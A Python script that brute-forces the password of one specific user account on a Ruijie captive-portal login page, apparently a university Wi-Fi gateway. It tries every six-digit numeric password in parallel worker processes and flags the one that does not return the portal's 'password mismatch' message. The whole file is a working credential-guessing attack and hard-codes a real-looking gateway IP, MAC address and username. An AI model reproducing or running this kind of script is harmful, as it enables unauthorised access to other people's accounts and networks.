#!/usr/bin/env python
# encoding: utf-8
import time
import requests
import re
from multiprocessing import Pool

def get(pwd):
	url='http://222.179.99.144:8080/eportal/webGateModeV2.do?method=login&param=true&wlanuserip=10.117.30.232&wlanacname=Ruijie_Ac_80eeb9&ssid=CQWU&nasip=192.168.255.5&mac=f6995122027c&t=wireless-v2-plain&url=http://web.archive.org/web/20151116122728/http://segmentfault.com/a/1190000000356021&username=201312384043&pwd='+str(pwd)
	# print(url)
	webdata=requests.get(url)
	# print(webdata.text)
	pattern=re.compile('<div id="errorInfo_center" val="(.*?)"></div>')
	judge=str(pattern.findall(webdata.text))[2:-2]
	if judge!='认证失败!,密码不匹配,请输入正确的密码!': #
		print("密码：%s success! >>>>>%s"%(pwd,judge))
		return True
	else:
		print(pwd+' was test!')

def loop():
	for i in range(258146,1000000):
		a="%06d"%i
		yield a

def timed(func):
	def wrapper():
		start = time.clock()
		func()
		end = time.clock()
		print('%.1f seconds'%(end - start))
	return wrapper

@timed
def main():
	gen = loop()
	pool = Pool()
	pool.map(get, gen)
	# pool.close()
	# pool.join()

@timed
def slown():
	for i in range(1000):
		a = "%06d" % i
		get(a)

if __name__ == '__main__':
	main()
	# slown()
